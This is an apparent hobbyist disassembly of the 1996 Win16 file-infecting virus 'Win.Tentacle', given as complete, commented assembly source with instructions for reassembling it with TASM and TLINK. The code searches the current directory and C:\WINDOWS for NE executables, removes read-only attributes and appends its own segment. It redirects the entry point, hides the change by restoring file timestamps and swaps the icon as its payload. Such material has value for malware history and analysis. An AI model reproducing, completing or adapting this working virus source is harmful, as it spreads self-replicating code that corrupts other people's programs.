   ; comment %
   ;
   ; Name            : Win.Tentacle
   ; Author          : ?
   ; Type            : direct acting Win16 NE appender
   ; Size            : 1948 bytes virus body (because of relocation stuff
   ;                   infected files increase for at least 1958 bytes)
   ; Origin          : ?
   ; When            : 1996
   ; Status          : was in the wild (distributed in cracking newsgroups in 1996)
   ; Disassembled by : Black Jack
   ; Contact me      : Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net
   ;
   ; Description:
   ; When an infected file is run, the virus gets control. It then searches for a
   ; .EXE file in the current directory, and another one in the C:\WINDOWS
   ; directory and tries to infect it. While infection the virus creates a
   ; temporary file C:\TENTACLE.$$$ and rebuilds there an infected image of the
   ; victim file. When the infection process is finished this file is copied back
   ; over the victim file and then deleted.
   ; The infection technique is adding another segment with the virus code at the
   ; end of the file. To add its own entry to the segment table, it checks if there
   ; is enough unused room between the end of the NE header tables and the start of
   ; the first segment and aborts infection if not. Then it shifts back all tables
   ; after the segment table (therefore overwriting the unused fill bytes) and
   ; fixes their offsets in the NE header, so that it can write its own segment
   ; descriptor at the end of the segment table. Finally the entry point in the NE
   ; header is set to the virus body, and the old one is stored in a relocation
   ; item at the end of the virus body that is used to restore control to the host.
   ; Whenever the virus infects a file between 00:00am and 00:15am the virus
   ; activates its payload routine: it searches the resource table of the victim
   ; file for the icon resource and replaces it with its own icon, a picture of the
   ; violet tentacle from the classical computer game "the day of the tentacle".
   ;
   ; Reassembly tested with Tasm 3.1 and TLink 3.0 .
   ;
   ;         TASM /M tentacle
   ;         TLINK tentacle
   ;
   ; first generation sample is a DOS EXE file and infects all suitable EXE files
   ; in the current directory only.
   ;
   ; %

   .model tiny
   .386
   .code
   org 0

   virus_start:
   segm_offset     dw      0
   segm_phys_size  dw      (virus_end - virus_start)
   segm_attribs    dw      0001110101010000b
   segm_virt_size  dw      (virus_end - virus_start)

   tmp_filename    db      "C:\TENTACLE.$$$", 0

   windir_filespec db      "C:\WINDOWS\"
   filespec        db      "*.EXE", 0

   relocation_stuff:
           dd      0000FFFFh       ; pointers that will become relocated
                       ; must be initialised by 0:FFFF

   ; This is the real start of the relocation data:
           dw      1               ; one relocation item
           db      3               ; 32bit far pointer
                   db      0               ; internal reference
           dw      offset org_entry  ; offset of pointer to relocate

   size_of_relocation_stuff EQU ($ - relocation_stuff)


   ; The relocation destination (host entry CS:IP) will be written afterwards


   virus_entry:
       push    ds                      ; save DS
       pusha                           ; save all registers

       push    cs                      ; DS=CS
       pop     ds

       sub     sp,size stack_frame     ; reserve room on stack
       mov     bp,sp                   ; setup stack frame

       mov     ah,1Ah                  ; set DTA to DS:DX
       lea     dx,[bp.dta]             ; Load effective addr
       push    ds                      ; save DS
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       pop     ds                      ; restore DS

       mov     dx,offset filespec      ; DX=ptr to "*.EXE"
       mov     bx,1                    ; get one file in current directory
       call    infect_directory        ; search & infect!

       mov     dx,offset windir_filespec ; DX=ptr to "C:\WINDOWS\*.EXE"
       mov     bx,3                    ; get three files in windows directory
       call    infect_directory        ; search & infect!

       mov     ah,1Ah                  ; set DTA to DS:DX
       mov     dx,7Fh                  ; DX=80h (standart DTA offset)
       inc     dx
       push    ds                      ; save DS
       push    es                      ; DS=ES=PSP (or equivalent) segment
       pop     ds
       int     21h

       pop     ds                      ; restore DS

       add     sp,size stack_frame     ; free room on stack

       popa                            ; restore all registers
       pop     ds                      ; restore DS
       jmp     cs:org_entry            ; jump to host entrypoint



   ; ----- INFECT A DIRECTORY --------------------------------------------------
   ; DX=offset of file specification ("*.EXE" or "C:\WINDOWS\*.EXE")
   ; BX=files to infect

   infect_directory:
   ;*      cmp     dx,offste windir_filespec  ; search in windows directory?
       db      81h,0FAh,18h,0          ; fixup - byte match
       jne     not_windows_dir

       push    es                      ; save ES
       mov     si,dx                   ; SI=ptr to "C:\WINDOWS\"
       lea     di,[bp.full_filename]   ; DI=ptr to buffer on stack
       mov     word ptr [bp.filename_ptr],di  ; save offset to full filename
       push    ss                      ; ES=SS
       pop     es
       mov     cx,11                   ; length of "C:\WINDOWS\"
           cld                             ; clear direction flag
       rep     movsb                   ; move path ("C:\WINDOWS\")
       pop     es                      ; restore ES
       jmp     start_filesearch

   not_windows_dir:
       lea     ax,[bp.dta+1Eh]         ; AX=offset of found filename in DTA
       mov     word ptr [bp.filename_ptr],ax  ; save offset to full filename
   start_filesearch:
       mov     word ptr [bp.filename_ptr+2],ss ; save segm. to full filename

       mov     ah,4Eh                  ; find first file
       mov     cx,2                    ; normal and hidden files
       jmp     do_file_search

   do_file:
   ;*      cmp     dx,offste windir_filespec  ; filesearch in windows directory?
       db      81h,0FAh,18h,0          ; fixup - byte match
       jne     not_windows_dir_2

       push    es                      ; save ES and DS
       push    ds
       mov     ax,ss                   ; ES=DS=SS
       mov     ds,ax
       mov     es,ax
       lea     si,[bp.dta+1Eh]         ; SI=offset of found filename
       lea     di,[bp.full_filename+11]
       mov     cx,0Dh
           cld                             ; clear direction flag
           rep     movsb                   ; copy filename
       pop     ds
       pop     es

   not_windows_dir_2:
       test    byte ptr [bp.dta+15h],1 ; read only attribute set?
       jz      not_readonly

       push    ds                      ; save DS
       push    dx                      ; save DX

       mov     ax,3000h                ; AX=4301h (set file attributes)
       add     ax,1301h
       xor     ch,ch                   ; set high byte of attributes to zero
       mov     cl,[bp.dta+15h]         ; CL=low byte of attributes
   ;*      and     cx,0FFFEh               ; delete read-only attribute
       db      83h,0E1h,0FEh           ; fixup - byte match
       lds     dx,[bp.filename_ptr]    ; DS:DX=address of filename
       int     21h

       pop     dx                      ; restore DX
       pop     ds                      ; restore DS

       jc      findnext                ; error? if so, search on

   not_readonly:
       call    infect_file             ; infect the file!
       jc      findnext                ; on error while infecting search on!
       dec     bx                      ; decrement infection counter
       jz      done_directory          ; enough files infected?
   findnext:
       mov     ah,4Fh                  ; find next file

   do_file_search:
       int     21h                     ; do the file search
       jnc     do_file                 ; if no error happened, process file

   done_directory:
           ret


   ; ----- INFECT A FILE -------------------------------------------------------

   infect_file:
       pushad                          ; save all registers

       mov     ax,3D00h                ; open file read-only
       push    ds                      ; save DS
       lds     dx,[bp.filename_ptr]    ; DS:DX=pointer to filename
       int     21h

       pop     ds                      ; restore DS

       jnc     open_file_ok
       jmp     exit_infect
   open_file_ok:
       mov     bx,ax                   ; handle to BX
       mov     [bp.source_handle],ax   ; save handle

       call    get_file_date_time_size

       mov     ah,3Fh                  ; read DOS header
       mov     cx,64                   ; DOS header size
       lea     dx,[bp.rw_buffer]       ; Load effective addr
       push    ds                      ; save DS
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       pop     ds                      ; restore DS

       jnc     read_dos_header_ok
       jmp     close_file
   read_dos_header_ok:
       mov     ax,word ptr [bp.rw_buffer]  ; AX=exe marker
       dec     ax                      ; anti-heuristic
       cmp     ax,"ZM"-1               ; EXE file?
       je      exe_file
       jmp     close_file              ; close if not
   exe_file:
   ;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFEh  ; maxmem item in
                                           ; DOS header is infection marker
       db      83h,0BEh,83h,0,0FEh     ; fixup - byte match
       jne     not_infected_yet
       jmp     close_file              ; already infected
   not_infected_yet:

   ;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFFh  ; has the maxmem item
                                           ; the standart value?
       db      83h,0BEh,83h,0,0FFh     ; fixup - byte match
       je      standart_maxmem
           jmp     close_file              ; if not, then don't infect the file
   standart_maxmem:

       mov     word ptr [bp.rw_buffer+0Ch],0FFFEh  ; mark as infected
       cmp     word ptr [bp.rw_buffer+18h],40h ; new exe file?
       jae     new_exe
       jmp     close_file                      ; if not, then close
   new_exe:

       mov     ah,3Ch                  ; create temporary file
       mov     cx,2                    ; with hidden attributes
       mov     dx,offset tmp_filename  ; DS:DX=address of filename
       int     21h

       jnc     createfile_ok
       jmp     close_file
   createfile_ok:

       mov     [bp.dest_handle],ax     ; save temp file handle

       mov     ah,40h                  ; write DOS header of temp file
       mov     bx,[bp.dest_handle]     ; BX=file handle
       mov     cx,64                   ; CX=length to write
       lea     dx,[bp.rw_buffer]       ; DS:DX=address write buffer
       push    ds                      ; save DS
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       pop     ds                      ; restore DS

       jnc     write_dos_header_to_tmp_file_ok
       jmp     close_tmp_file
   write_dos_header_to_tmp_file_ok:

       mov     ecx,dword ptr [bp.rw_buffer+3Ch]  ; ECX=new exe header offset
       mov     [bp.offs_other_tbls],ecx
       mov     [bp.new_header_offs],ecx
       sub     ecx,64                  ; size of dos header already written
       call    copy_file_block         ; copy rest of DOS stub
       jnc     copy_stub_ok            ; no error->go on
       jmp     close_tmp_file

   copy_stub_ok:
       mov     bx,[bp.source_handle]   ; BX=handle of victim file
       mov     ah,3Fh                  ; read NE header
       mov     cx,64                   ; size of NE header
       lea     dx,[bp.rw_buffer]       ; DX=offset of buffer
       push    ds                      ; save DS
       push    ss                      ; DS=SS=segment of buffer
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       jnc     read_NE_header_OK
       jmp     close_tmp_file
   read_NE_header_OK:

           mov     ax,word ptr [bp.rw_buffer]  ; AX=new exe marker
       inc     ax                      ; anti-heuristic
       cmp     ax,"EN"+1               ; NE exe file?
       je      NE_file
       jmp     close_tmp_file          ; if not, then abort infection
   NE_file:

       mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
       mov     eax,1                   ; EAX=1
       shl     eax,cl                  ; EAX=alignment unit
       mov     [bp.alignment_unit],eax ; save it
       mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
       mov     eax,[bp.file_size]      ; EAX=filesize
       shr     eax,cl                  ; EAX=filesize in alignment units
       mov     [bp.new_sect_descr+0],ax  ; save it as offset for the new
                       ; segment that is going to be created
       mov     eax,[bp.alignment_unit] ; EAX=alignment unit
       dec     eax                     ; set all bits below alignemt
       test    eax,[bp.file_size]      ; filesize already aligned?
       jz      filesize_already_aligned
       inc     word ptr [bp.new_sect_descr+0]  ; if not, round it up
   filesize_already_aligned:
       mov     ax,segm_phys_size       ; copy physical size of segment
       mov     [bp.new_sect_descr+2],ax
       mov     ax,segm_attribs         ; copy segment attributes
       mov     [bp.new_sect_descr+4],ax
       mov     ax,segm_virt_size       ; copy virutal size of segment
       mov     [bp.new_sect_descr+6],ax

       cmp     word ptr [bp.rw_buffer+22h],40h ;is the segment table directly
                       ; after the NE header (standart case)?
       je      segment_table_ok        ; if not, better not infect the file
       jmp     close_tmp_file
   segment_table_ok:

       mov     ah,3Fh                  ; read the offset of the first segment
       mov     cx,2                    ; read a word
       lea     dx,[bp.first_segm_offs] ; DX=offset read buffer
       push    ds                      ; save DS
       push    ss                      ; DS=SS=segment read buffer
       pop     ds
       int     21h

       pop     ds                      ; restore DS

       jnc     read_first_segm_offs_ok
       jmp     close_tmp_file
   read_first_segm_offs_ok:

       mov     ax,4201h                ; move file pointer relative to
                       ; current position
       mov     cx,0FFFFh               ; CX:DX=-2 (new filepointer position)
       mov     dx,0FFFEh
       int     21h                     ; set the filepointer back to the
                       ; start of the segment table

       jnc     move_filepointer_back_to_segm_table_ok
       jmp     close_tmp_file
   move_filepointer_back_to_segm_table_ok:

       xor     eax,eax                 ; EAX=0
       mov     ax,word ptr [bp.first_segm_offs]  ; EAX=aligned file offset
                             ; of first segment
       mul     dword ptr [bp.alignment_unit]     ; EAX=file offset of the
                             ; first segment in bytes
       mov     [bp.first_segm_offs],eax          ; save it

       mov     ebx,dword ptr [bp.rw_buffer+2Ch]
       ; EBX=beginning of the nonresident-name table (relative to filestart).
       ; This is the last table in the NE header.

       xor     ecx,ecx                         ; ECX=0
       mov     cx,word ptr [bp.rw_buffer+20h]  ; ECX=size of nonresident name
                           ; table in bytes
       add     ebx,ecx                 ; EBX=size of NE header + all tables
       sub     eax,ebx                 ; EAX=free room between the end of
                       ; the NE header and the first segment
   ;*      cmp     eax,8                   ; is there enough room left to add
                       ; another segment descriptor ?
       db      66h,3Dh,08h,0,0,0       ; fixup - byte match
       jge     segment_descriptor_adding_possible
       jmp     close_tmp_file
   segment_descriptor_adding_possible:

       mov     ax,word ptr [bp.rw_buffer+16h]  ; entrypoint segment index
       mov     [bp.host_entry_cs],ax           ; save it
       mov     ax,word ptr [bp.rw_buffer+14h]  ; entrypoint IP
       mov     [bp.host_entry_ip],ax           ; save it
       mov     ax,word ptr [bp.rw_buffer+1Ch]  ; segment count
       inc     ax                              ; add another segment
       mov     word ptr [bp.rw_buffer+1Ch],ax  ; save new segment count
       mov     word ptr [bp.rw_buffer+16h],ax  ; new entry segment index
       mov     word ptr [bp.rw_buffer+14h],offset virus_entry  ; set new
                                   ; entry IP
       and     byte ptr [bp.rw_buffer+37h],011110111b  ; windows flags:
                               ; kill gangload area

   ; fixup the offsets of the other NE header tables (all are after the segment
   ; table and therefore shifted back)

       add     word ptr [bp.rw_buffer+4h],8    ; entry table
       add     word ptr [bp.rw_buffer+24h],8   ; resource table
       add     word ptr [bp.rw_buffer+26h],8   ; resident-name table
       add     word ptr [bp.rw_buffer+28h],8   ; module-reference table
       add     word ptr [bp.rw_buffer+2Ah],8   ; imported-name table
       add     dword ptr [bp.rw_buffer+2Ch],8  ; nonresident-name table

       mov     ah,40h                  ; write modified NE header to tmp file
       mov     bx,[bp.dest_handle]     ; BX=temp file handle
       mov     cx,64                   ; NE header size
       lea     dx,[bp.rw_buffer]       ; DX=write buffer offset
       push    ds                      ; save DS
       push    ss                      ; DS=SS=write buffer segment
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       jnc     write_NE_header_ok
       jmp     close_tmp_file
   write_NE_header_ok:

       xor     eax,eax                 ; EAX=0
       mov     ax,word ptr [bp.rw_buffer+1Ch]  ; EAX=number of segments
       dec     eax                     ; EAX=old number of segments
       mov     ecx,8                   ; ECX=8 (size of a segment descriptor)
       mul     ecx                     ; EAX=old size of segm descriptor tbl

       add     [bp.offs_other_tbls],40h+8; until now, offs_other_tbls
       add     [bp.offs_other_tbls],eax  ; contained the offset of the new
                         ; exe header, now we set it to the
                         ; end of the new segment table.

       mov     ecx,eax                 ; copy old segment descriptor table
       call    copy_file_block         ; to temporary file

       jnc     copy_segment_table_ok
       jmp     close_tmp_file
   copy_segment_table_ok:

       mov     ah,40h                  ; write our own segment descriptor
                       ; to the file
       mov     cx,8                    ; size of a segment descriptor
       lea     dx,[bp.new_sect_descr]  ; DX=offset of write buffer
       push    ds                      ; save DS
       push    ss                      ; DS=SS=segment of write bufer
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       jnc     write_our_descriptor_ok
       jmp     close_tmp_file
   write_our_descriptor_ok:

       mov     ecx,[bp.first_segm_offs]  ; ECX=size of the rest of the
       sub     ecx,[bp.offs_other_tbls]  ; NE header tables
       call    copy_file_block         ; copy them too

       mov     ax,4201h                ; move file pointer relative to
                       ; current position
       mov     bx,[bp.source_handle]   ; BX=handle of victim
       mov     cx,0                    ; CX:DX=8 (new file position)
       mov     dx,8                    ; done to skip the padding space that
       int     21h                     ; was overwritten with the new
                       ; segment descriptor

       jnc     skip_padding_bytes
       jmp     close_tmp_file
   skip_padding_bytes:

       mov     ecx,0FFFFFFFFh          ; whole file body
       call    copy_file_block         ; copy the file body
       jnc     copy_file_body_ok
       jmp     close_tmp_file
   copy_file_body_ok:

       xor     eax,eax                 ; EAX=0
       mov     ax,[bp.new_sect_descr+0]  ; EAX=aligned offset of our segment
       mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignment shift
       shl     eax,cl                  ; EAX=offset of our segment in bytes

       push    eax                     ; CX:DX=EAX
       pop     dx
       pop     cx
       mov     ax,4200h                ; go to our segment offset in file
       mov     bx,[bp.dest_handle]     ; BX=temp file handle
       int     21h

       jnc     move_filepointer_to_our_segment_ok
       jmp     close_tmp_file
   move_filepointer_to_our_segment_ok:

       mov     ah,40h                  ; write virus body to file
       mov     cx,(org_entry-virus_start) ; write whole virus body excluding
                       ; the last dword (original host
                       ; entry point, must be relocated
                       ; and therefore initialised).
       mov     dx,offset virus_start   ; DX=offset write buffer=virus body
       int     21h

       jnc     write_virus_body_ok
       jmp     close_tmp_file
   write_virus_body_ok:

       mov     ah,40h                  ; write relocation stuff
       mov     cx,size_of_relocation_stuff ; size of relocation stuff
       mov     dx,offset relocation_stuff  ; DX=offset write buffer
       int     21h
       jc      close_tmp_file

       mov     ah,40h                  ; write original host entry point
                       ; to our relocation item
           mov     cx,2                    ; CX=4 (size to write)
           shl     cx,1                    ; what for???
       lea     dx,[bp.host_entry_cs]   ; DX=offset write buffer
       push    ds                      ; save DS
       push    ss                      ; DS=SS=segment write buffer
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       jc      close_tmp_file

       mov     ah,2Ch                  ; get time
       int     21h

       cmp     cx,15                   ; between 00:00a and 00:15a ?
       jae     no_payload              ; if not, don't activate payload
       call    search_icon_resource
       jc      no_payload              ; on error, skip payload
       call    write_icon              ; give the file our own icon
   no_payload:

       mov     ah,3Eh                  ; close temp file
       int     21h

       mov     ah,3Eh                  ; close victim file
       mov     bx,[bp.source_handle]   ; BX=victim file handle
       int     21h

       mov     dx,offset tmp_filename  ; DS:DX=pointer to temp file name
       mov     ax,3D00h                ; reopen temp file read-only
       int     21h

       jc      delete_tmp_file
       mov     [bp.source_handle],ax   ; save handle

       mov     ah,3Ch                  ; recreate victim file
       mov     cx,0                    ; no attributes
       push    ds                      ; save DS
       lds     dx,[bp.filename_ptr]    ; DS:DX=ptr to full victim filename
       int     21h

       pop     ds                      ; restore DS
       jc      delete_tmp_file

       mov     bx,ax                   ; handle to BX
       mov     [bp.dest_handle],ax     ; save handle

       mov     ecx,0FFFFFFFFh          ; copy the whole temp file over the
       call    copy_file_block         ; victim file

       mov     ax,3000h                ; AX=5701h - set file date and time
       add     ax,2701h
       mov     bx,[bp.dest_handle]     ; BX=handle of victim file
       mov     dx,[bp.file_date]       ; CX=old file date
       mov     cx,[bp.file_time]       ; DX=old file time
       int     21h

       mov     ah,3Eh                  ; close victim file
       int     21h

       mov     bx,[bp.source_handle]   ; BX=handle of temp file
       mov     ah,3Eh                  ; close temp file
       int     21h

       mov     dx,offset tmp_filename  ; DS:DX=pointer to temp file name
       mov     ah,41h                  ; delete temp file
       int     21h

       clc                             ; clear carry flag (indicate success)
       jmp     exit_infect

   close_tmp_file:
       mov     bx,[bp.dest_handle]     ; BX=handle of temp file
       mov     ah,3Eh                  ; close temp file
       int     21h

   delete_tmp_file:
       mov     dx,offset tmp_filename  ; DS:DX=pointer to temp file name
       mov     ah,41h                  ; delete temp file
       int     21h

   close_file:
       mov     bx,[bp.source_handle]   ; BX=handle of victim file
       mov     ah,3Eh                  ; close fictim file
       int     21h

       stc                             ; set carry flag (indicate error)

   exit_infect:
       popad                           ; Restore all regs
           ret


   ; ----- GET DATE, TIME AND SIZE OF THE OPENED FILE --------------------------

   get_file_date_time_size:
       push    cx                      ; save CX and DX
       push    dx

       mov     ax,5700h                ; get date and time
       int     21h

       mov     [bp.file_date],dx       ; save date
       mov     [bp.file_time],cx       ; save time

       xor     cx,cx                   ; CX:DX=0 (distance to move)
       xor     dx,dx
       mov     ax,4202h                ; move filepointer relative to
       int     21h                     ; end of file
                       ; in DX:AX the new filpointer is
                       ; returned (filesize in this case)

       mov     word ptr [bp.file_size+2],dx    ; save filesize
       mov     word ptr [bp.file_size],ax

       xor     cx,cx                   ; DX:CX=0 (distance to move)
       xor     dx,dx
       mov     ax,4200h                ; move filepointer relative to
       int     21h                     ; beginning of file

       pop     dx                      ; restore DX and CX
       pop     cx

           ret


   ; ----- COPY ECX BYTES FROM VICTIM FILE TO TEMP FILE ------------------------

   copy_file_block:
       pushad                          ; save all 32bit registers
       sub     sp,256                  ; allocate a 256 byte buffer from stack
       mov     [bp.bytes_to_copy],ecx  ; save length of block to copy
       mov     dx,sp                   ; DX=offset buffer

   copy_file_block_loop:
       cmp     [bp.bytes_to_copy],0    ; whole block moved?
       je      copy_file_block_done    ; then we're done
       cmp     [bp.bytes_to_copy],256  ; more than 256 bytes left?
       jbe     copy_remaining_bytes_block

       mov     cx,256                  ; then just copy 256 bytes
       jmp     read_file_block

   copy_remaining_bytes_block:
       mov     cx,word ptr [bp.bytes_to_copy]  ; copy all bytes left

   read_file_block:
       push    cx                      ; save size to read/write
       mov     bx,[bp.source_handle]   ; BX=handle of source file
       mov     ah,3Fh                  ; read from file function
       push    ds                      ; save DS
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       mov     bx,[bp.dest_handle]     ; BX=handle of destination file
       mov     cx,ax                   ; write as many bytes as were read
       mov     ah,40h                  ; write block to temporary file
       push    ds                      ; save DS
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       pop     ds                      ; restore DS
       cmp     cx,ax                   ; sizes of read block=written block ?
       pop     cx                      ; restore size to read and write
       jnz     copy_file_block_error   ; if not equal, then an error occured
       cmp     cx,ax                   ; size of read/written block equal
                       ; to the size we planned to read?
       jne     copy_file_block_done    ; if not, we're at the end of the file

       cwde                            ; convert word to dword (AX->EAX)
       sub     [bp.bytes_to_copy],eax  ; we've copied EAX bytes more
       jmp     copy_file_block_loop    ; copy next file block

   copy_file_block_error:
       stc                             ; set carry flag (indicate error)
       jmp     copy_file_block_ret

   copy_file_block_done:
       clc                             ; clear carry flag (indicate success)
       add     sp,100h                 ; remove buffer from stack
       popad                           ; restore all 32bit registers

   copy_file_block_ret:
           ret


   ; ----- SEARCH THE ICON RESOURCE AND SET THE FILEPOINTER TO IT --------------

   search_icon_resource:
       push    ds                      ; save DS

       push    ss                      ; DS=SS
       pop     ds

       xor     eax,eax                 ; EAX=0
       mov     ax,word ptr [bp.rw_buffer+24h]  ; EAX=offset resource table
                           ; relative to NE header
       add     eax,[bp.new_header_offs]  ; EAX=offset resource table
                         ; relative to file start

       push    eax                     ; CX:DX=EAX
       pop     dx
       pop     cx
       mov     ax,4200h                ; set filepointer to resource table
       int     21h

       jnc     go_to_resource_table_ok
       jmp     exit_search_icon_resource
   go_to_resource_table_ok:

       mov     ah,3Fh                  ; read resource alignment shift
       mov     cx,2                    ; read a word
       lea     dx,[bp.resource_stuff1] ; DX=offset read buffer
       int     21h

       jnc     read_resource_shift_ok
       jmp     exit_search_icon_resource
   read_resource_shift_ok:

       mov     si,[bp.resource_stuff1] ; SI=resource alignment shift

   search_icon_resource_loop:
       mov     ah,3Fh                  ; read resources type and count
       mov     cx,4                    ; read two words
       lea     dx,[bp.resource_stuff1] ; DX=offset read buffer
       int     21h

       jnc     read_resource_type_count_ok
       jmp     exit_search_icon_resource
   read_resource_type_count_ok:

       mov     ax,4201h                ; set filepointer relative to
                       ; current position
       xor     cx,cx                   ; CX:DX=4 (skip reserved dword
       mov     dx,4                    ; in TYPEINFO structure)
       int     21h
       jc      exit_search_icon_resource

       cmp     word ptr [bp.resource_stuff1],0      ; end of TYPEINFO array?
       je      exit_search_icon_resource_set_carry  ; then exit with error

       cmp     word ptr [bp.resource_stuff1],8003h  ; a icon resource?
       je      found_icon_resource

       mov     ax,[bp.resource_stuff2] ; AX=ResourceCount
       mov     cx,12                   ; size of NAMEINFO struct
       mul     cx                      ; DX:AX=size of NAMEINFO struct array

       mov     cx,dx                   ; CX:DX=size of NAMEINFO struct array
       mov     dx,ax
       mov     ax,4201h                ; set filepointer relative to
                       ; current position
       int     21h                     ; skip all NAMEINFO array (go to next
                       ; TYPEINFO element).

       jc      exit_search_icon_resource
       jmp     search_icon_resource_loop  ; check next TYPEINFO element

   found_icon_resource:
       mov     di,[bp.resource_stuff2] ; AX=ResourceCount

   search_suitable_icon:
       mov     ah,3Fh                  ; read start of NAMEINFO struct
                       ; (offset and length)
       mov     cx,4                    ; read two words
       lea     dx,[bp.resource_stuff1] ; DX=offset read buffer
       int     21h
       jc      exit_search_icon_resource

       xor     eax,eax                 ; EAX=0
       mov     ax,[bp.resource_stuff2] ; EAX=resource length (aligned)
       mov     cx,si                   ; CX=resource alignment shift
       shl     eax,cl                  ; EAX=resource length (bytes)
       cmp     eax,744                 ; is it big enough?
       jae     set_filepointer_to_resource  ; if yes, then use it!

       mov     ax,4201h                ; set filepointer relative to th
                       ; current position
       xor     cx,cx                   ; CX:DX=8 (skip rest of this NAMEINFO
       mov     dx,8                    ; structure)
       int     21h

       jc      exit_search_icon_resource

       dec     di                      ; decrement resource counter
       jnz     search_suitable_icon    ; if counter not zero, search on
       jmp     search_icon_resource_loop  ; otherwise we failed

   set_filepointer_to_resource:
       xor     eax,eax                 ; EAX=0
       mov     ax,[bp.resource_stuff1] ; EAX=resource offset (aligned)
       mov     cx,si                   ; CX=resource alignment shift
       shl     eax,cl                  ; EAX=resource offset (bytes)
   ;*      add     eax,104                 ; skip header
       db      66h,5,68h,0,0,0         ; fixup - byte match

       push    eax                     ; CX:DX=EAX
       pop     dx
       pop     cx
       mov     ax,4200h                ; go to icon resource in file
       mov     bx,[bp.dest_handle]     ; BX=file handle
       int     21h

       jmp     exit_search_icon_resource  ; done!

   exit_search_icon_resource_set_carry:
       stc                             ; set carry flag (indicate error)

   exit_search_icon_resource:
       pop     ds
           ret


   ; ----- WRITES OUR OWN ICON TO THE FILE -------------------------------------

   write_icon:
       mov     ah,40h                  ; write new icon to file
       mov     cx,icon_size            ; CX=length to write
       mov     dx,offset icon          ; DS:DX=buffer to write
       int     21h

           ret


   icon:
       db 002h, 022h, 022h, 022h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 00Dh, 072h, 0AAh, 0A2h, 022h, 020h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 005h, 0DDh, 0D8h, 02Ah, 0AAh, 0A2h, 022h, 022h
       db 022h, 022h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 0DDh, 0DDh, 0D5h, 082h, 02Ah, 0AAh, 0AAh
       db 0AAh, 0AAh, 022h, 022h, 022h, 022h, 022h, 020h
       db 000h, 05Dh, 0DDh, 0D5h, 055h, 055h, 050h, 022h
       db 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 022h
       db 000h, 00Dh, 0DDh, 0D5h, 055h, 055h, 055h, 055h
       db 055h, 055h, 055h, 055h, 055h, 055h, 055h, 057h
       db 000h, 005h, 0DDh, 0D5h, 055h, 055h, 022h, 022h
       db 022h, 022h, 025h, 055h, 055h, 055h, 055h, 050h
       db 000h, 000h, 0DDh, 0D5h, 055h, 052h, 02Ah, 0AAh
       db 0AAh, 0AAh, 022h, 045h, 055h, 055h, 055h, 000h
       db 000h, 000h, 05Dh, 0D5h, 054h, 0AAh, 0AAh, 022h
       db 022h, 0AAh, 0AAh, 025h, 055h, 055h, 055h, 000h
       db 000h, 000h, 00Dh, 0DDh, 052h, 0A2h, 022h, 022h
       db 022h, 022h, 02Ah, 0A2h, 055h, 055h, 050h, 000h
       db 000h, 000h, 00Dh, 0DDh, 08Ah, 022h, 022h, 022h
       db 022h, 022h, 022h, 0AAh, 055h, 055h, 050h, 000h
       db 000h, 000h, 005h, 0DDh, 0DAh, 020h, 022h, 022h
       db 022h, 022h, 020h, 0AAh, 055h, 055h, 000h, 000h
       db 000h, 000h, 000h, 0DDh, 0D2h, 0A0h, 000h, 022h
       db 022h, 022h, 000h, 0A2h, 055h, 050h, 000h, 000h
       db 000h, 000h, 000h, 05Dh, 0DDh, 0AAh, 020h, 000h
       db 000h, 000h, 002h, 0A5h, 055h, 050h, 000h, 000h
       db 000h, 005h, 050h, 07Dh, 0DDh, 050h, 02Ah, 0AAh
       db 022h, 02Ah, 0A2h, 055h, 055h, 000h, 000h, 000h
       db 000h, 008h, 055h, 05Dh, 0D5h, 055h, 022h, 022h
       db 022h, 025h, 055h, 055h, 050h, 000h, 000h, 000h
       db 000h, 000h, 0D5h, 055h, 0D5h, 052h, 0AAh, 0AAh
       db 0AAh, 022h, 055h, 055h, 070h, 000h, 000h, 000h
       db 000h, 000h, 00Dh, 055h, 0DDh, 02Ah, 022h, 022h
       db 022h, 0AAh, 055h, 055h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 05Dh, 0DDh, 02Ah, 002h, 022h
       db 022h, 02Ah, 025h, 057h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 005h, 0DDh, 05Ah, 020h, 000h
       db 000h, 00Ah, 025h, 057h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 0DDh, 055h, 02Ah, 022h
       db 022h, 0A2h, 055h, 057h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 00Dh, 052h, 02Ah, 022h
       db 055h, 055h, 055h, 057h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 005h, 022h, 022h, 022h
       db 025h, 055h, 055h, 050h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 008h, 022h, 022h, 022h
       db 025h, 000h, 055h, 050h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 050h, 000h, 002h
       db 050h, 000h, 075h, 050h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 00Dh, 0D5h, 055h
       db 000h, 000h, 055h, 050h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 008h, 0D5h, 000h
       db 000h, 000h, 00Dh, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
